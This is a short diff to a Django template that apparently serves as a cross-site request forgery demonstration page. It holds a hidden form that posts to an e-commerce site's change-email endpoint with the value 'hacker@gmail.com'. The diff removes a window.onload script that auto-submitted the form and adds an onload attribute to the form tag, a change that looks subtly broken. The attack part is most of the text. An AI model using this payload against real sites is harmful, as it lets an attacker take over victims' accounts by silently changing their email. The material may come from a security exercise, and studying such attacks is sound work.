@@ -16,7 +16,7 @@ Home
 <h1> Hello Everyone </h1>
 
 
-<form action="https://ecommerce-mac.herokuapp.com/shop/changeEmail/" method="POST">{% csrf_token %}
+<form onload="submit();" action="https://ecommerce-mac.herokuapp.com/shop/changeEmail/" method="POST">{% csrf_token %}
     <input type="hidden" name="email" value="hacker@gmail.com" />
     <button class="btn btn-primary" type="submit">Submit</button>
     <button class= "btn btn-primary" id="xmlbutton" type = "button">Send XMLHttpRequest</button>
@@ -28,8 +28,6 @@ Home
 {% endblock %}
 {% block js %}
 <script>
-window.onload = function() {
-    document.forms[0].submit();
-}
+
 </script>
 {% endblock %}
